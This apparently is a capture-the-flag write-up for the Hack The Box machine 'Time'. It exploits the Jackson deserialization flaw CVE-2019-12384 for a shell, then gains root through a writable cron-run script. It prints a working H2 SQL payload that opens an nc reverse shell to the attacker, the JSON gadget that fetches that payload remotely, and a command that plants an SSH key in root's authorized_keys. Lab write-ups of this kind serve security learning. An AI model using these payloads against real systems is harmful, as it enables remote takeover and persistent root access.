![](time_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
</p>

# Scanning

## Nmap

`ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.214 | grep open | awk -F / '{print $1}' ORS=',') echo $ports && nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.214`
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
```

## Web_server

**Title:** **Online JSON parser :** What is JSON PARSER ONLINE? JSON PARSER ONLINE lets you parse JSON string into a pretty and colorful JSON tree view. It parse JSON String and converts it into a human readable format string.

* there are two options 

  **Option1:** **Beautify:** convert JSON single string code into a JSON tree view.

  **Option2:** **Validate (beta!):** Validates a JSON string against RFC 4627 (The application/json media type for JavaScript Object Notation) and against the JavaScript language specification.

  * **Error in Validate (beta!) option**

    when Validate with normal text string it through an error

	    Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'test': was expecting 'null', 'true', 'false' or NaN

  *this error not indicate any vulnerability, this error occurs because of the serialization of a Javascript object. All String values MUST be enclosed in double quotes in JSON.*
  
  *if we sent same string inside double quotes it works fine.*

* But the Error tells that the server using JACKSON JSON parser,
  
  **[Jackson](https://github.com/FasterXML/jackson) :** Jackson is a high-performance JSON processor for Java. More than that, Jackson is a suite of data-processing tools for Java (and the JVM platform), Jackson has been known as "the Java JSON library" or "the best JSON parser for Java".
  
  *this server using Jackson library for deserializing JSONs*
  
**vulnerability :** de-serialization vulnerability CVE-2019-12384

**Jackson gadgets - Anatomy of a vulnerability** doyensec.com [Report](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)

*an attacker may leverage this de-serialization vulnerability to trigger attacks such as Server-Side Request Forgery (SSRF) and remote code execution.*

* **attack**

  this attack produce in 2 steps
  
  * **First**, serve the inject.sql INIT file through a simple http server,
  * **Second**, call the script from the server.
  
# User Exploit

**First**, create **inject.sql**  
```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <tun0> 4141 >/tmp/f')
```

**Second**, serve the inject.sql INIT file through a simple http server

    sudo python -m SimpleHTTPServer 80
	  
**Third**, code that pass into the validate option
```json
[
   "ch.qos.logback.core.db.DriverManagerConnectionSource",
   {
      "url": "jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://<tun0>/injection.sql'"
   }
]
```
**Fourth**, open nc

    nc -nvlp 4141

**shell**,

```bash
listening on [any] 4141 ...
connect to [10.10.15.151] from (UNKNOWN) [10.10.10.214] 54528
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
pericles@time:/var/www/html$
```

* **user flag**

	  pericles@time:/var/www/html$ cat ~/user.txt
	  cat ~/user.txt
	  76086ade************************

# Local Enumeration

running lipeas found a script owned by user pericles
```bash
[+] .sh files in path
You own the script: /usr/bin/timer_backup.sh
```

**timer_backup.sh**

	pericles@time:/home/pericles$ ls -lsh /usr/bin/timer_backup.sh
	ls -lsh /usr/bin/timer_backup.sh
	-rwxrw-rw- 1 pericles pericles 88 Nov 18 04:00 /usr/bin/timer_backup.sh

	pericles@time:/home/pericles$ cat /usr/bin/timer_backup.sh
	cat /usr/bin/timer_backup.sh
	#!/bin/bash
	zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip

* script specified some root task that means script is running as root
  * this script backup complete server directory in root
* script is running in every ~10sec and after that script get reset

# Root Exploit

*putting any reverse-shell in the `timer_backup.sh` to get a root shell doesn't works properly because script exits as soon as it executed and so shell too.*
*simplest way to get proper root shell is to put ssh key in the script so that we can ssh as root.*

## public ssh key

* create ssh key: `ssh-keygen -f time`
* copy public ssh key: `cat time.pub`

	  ssh-rsa AAAA...ZXMk=

* put ssh key in `timer_backup.sh` script

	  echo "echo 'ssh-rsa AAAA...ZXMk=' >> /root/.ssh/authorized_keys" > /usr/bin/timer_backup.sh

* ssh in: `chdom 600 time`

	  ssh -i time root@10.10.10.214
	  
	  root@time:~# cat root.txt
	  dffebc49************************

### cron tab that occurs root privesc

`crontab -u root -l`
```bash
*/5 * * * * cp /root/timer_backup.sh /usr/bin/timer_backup.sh; chown pericles:pericles /usr/bin/timer.sh; chmod 766 /usr/bin/timer_backup.sh
```